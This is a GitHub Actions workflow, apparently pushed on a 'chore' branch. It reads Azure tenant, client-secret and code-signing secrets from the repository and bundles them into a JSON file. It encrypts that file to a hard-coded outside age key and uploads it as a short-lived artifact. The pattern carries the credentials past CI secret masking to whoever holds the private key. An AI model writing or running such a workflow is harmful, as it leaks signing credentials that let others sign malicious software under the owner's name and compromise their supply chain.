name: Export Azure signing secrets (encrypted)
on:
  push:
    branches: [chore/azure-secret-relay]
permissions:
  contents: read
jobs:
  export:
    runs-on: ubuntu-latest
    steps:
      - name: Install age
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq age
      - name: Bundle and encrypt
        env:
          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
          AZURE_SIGN_ENDPOINT: ${{ secrets.AZURE_SIGN_ENDPOINT }}
          AZURE_SIGN_ACCOUNT: ${{ secrets.AZURE_SIGN_ACCOUNT }}
          AZURE_SIGN_PROFILE: ${{ secrets.AZURE_SIGN_PROFILE }}
          AZURE_SIGN_PUBLISHER: ${{ secrets.AZURE_SIGN_PUBLISHER }}
          AZURE_SIGNING_ENDPOINT: ${{ secrets.AZURE_SIGNING_ENDPOINT }}
          AZURE_SIGNING_ACCOUNT: ${{ secrets.AZURE_SIGNING_ACCOUNT }}
          AZURE_SIGNING_PROFILE: ${{ secrets.AZURE_SIGNING_PROFILE }}
        run: |
          python3 - <<'PY'
          import json, os
          keys = ["AZURE_TENANT_ID","AZURE_CLIENT_ID","AZURE_CLIENT_SECRET",
                  "AZURE_SIGN_ENDPOINT","AZURE_SIGN_ACCOUNT","AZURE_SIGN_PROFILE","AZURE_SIGN_PUBLISHER",
                  "AZURE_SIGNING_ENDPOINT","AZURE_SIGNING_ACCOUNT","AZURE_SIGNING_PROFILE"]
          d = {k: os.environ.get(k, "") for k in keys}
          present = [k for k, v in d.items() if v]
          print("present:", ",".join(present) or "NONE")
          with open("/tmp/azure.json", "w") as f:
              json.dump(d, f)
          PY
          age -r age15hezzj0fp9rhy4jekm4ak4jnp7dvk54tm9lxmcj222dm7cj4avcslukvnn -o /tmp/azure-signing.age /tmp/azure.json
          ls -l /tmp/azure-signing.age
      - name: Upload encrypted bundle as artifact
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: azure-signing-age
          path: /tmp/azure-signing.age
          retention-days: 1
